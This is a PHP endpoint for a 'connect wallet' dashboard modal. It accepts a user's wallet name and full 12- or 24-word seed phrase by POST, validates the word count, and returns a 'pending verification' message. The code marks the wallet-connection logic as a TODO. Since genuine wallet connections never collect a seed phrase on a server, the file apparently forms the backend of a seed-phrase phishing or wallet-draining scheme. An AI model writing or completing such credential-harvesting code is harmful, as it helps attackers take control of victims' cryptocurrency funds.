<?php
/**
 * WALLET_HANDLER.PHP
 * Handles wallet connection requests from the connect wallet modal
 */

header('Content-Type: application/json');

// Include auth and DB
include '../includes/dashboard_init.php';

try {
    // Check if request method is POST
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        throw new Exception('Invalid request method. POST required.');
    }

    // Get POST data
    $input = file_get_contents('php://input');
    $data = json_decode($input, true);

    if (!$data) {
        // Fallback to form data if JSON fails
        $data = [
            'wallet_name' => $_POST['wallet_name'] ?? null,
            'mnemonic' => $_POST['mnemonic'] ?? null
        ];
    }

    // Validate required fields
    if (empty($data['wallet_name']) || empty($data['mnemonic'])) {
        throw new Exception('Wallet name and mnemonic are required.');
    }

    $wallet_name = trim($data['wallet_name']);
    $mnemonic = trim($data['mnemonic']);

    // Validate mnemonic format (12 or 24 words)
    $words = explode(' ', $mnemonic);
    $word_count = count(array_filter($words));
    
    if ($word_count !== 12 && $word_count !== 24) {
        throw new Exception('Mnemonic must contain 12 or 24 words.');
    }

    // TODO: Add wallet connection logic here
    // For now, return success response
    
    echo json_encode([
        'success' => true,
        'message' => 'Wallet connection request received and pending verification.',
        'wallet_name' => $wallet_name,
        'word_count' => $word_count,
        'timestamp' => time()
    ]);

} catch (Exception $e) {
    http_response_code(400);
    echo json_encode([
        'success' => false,
        'message' => $e->getMessage(),
        'error_code' => 'WALLET_ERROR'
    ]);
}
?>
